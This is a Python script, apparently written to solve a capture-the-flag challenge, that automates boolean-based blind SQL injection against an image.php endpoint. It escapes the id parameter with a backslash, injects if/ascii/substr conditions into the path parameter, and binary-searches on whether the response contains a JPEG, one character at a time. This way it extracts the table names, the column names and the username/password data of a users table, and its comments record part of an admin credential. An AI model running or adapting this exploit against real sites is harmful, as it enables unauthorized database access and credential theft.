'''
@Time : 2020/5/2 11:07
@Author : laolao
@FileName: 盲注脚本3.py
'''
import requests
import string

url = r'http://54e96125-36ed-491f-8ebd-bf1d1c1be1e5.node3.buuoj.cn/image.php'
payload=r"?id=\\0&path=union select * from images where id=1 and ascii(substr({},{},1))={} --+"

x=""
database="database()"
table = "(select group_concat(table_name) from information_schema.tables where table_schema=database())" # images,users
column='(select group_concat(column_name) from information_schema.columns where table_name=0x7573657273)' #  username,password
word='(select group_concat(username,password separator 0xefbc9b) from users)' # admine9599ba156e8f83ed73e
result = ''

for x in range(0, 100):
    high = 127
    low = 32
    mid = (low + high) // 2
    while high > low:
        payload = " or id=if(ascii(substr({},{},1))>{},1,0)#".format(word,x, mid)
        params = {
			'id':'\\\\0',
			'path':payload
		}
        response = requests.get(url, params=params)
        #print(response.url)
        if b'JFIF' in response.content:
            low = mid + 1
        else:
            high = mid
        mid = (low + high) // 2

    result += chr(int(mid))
    print(result)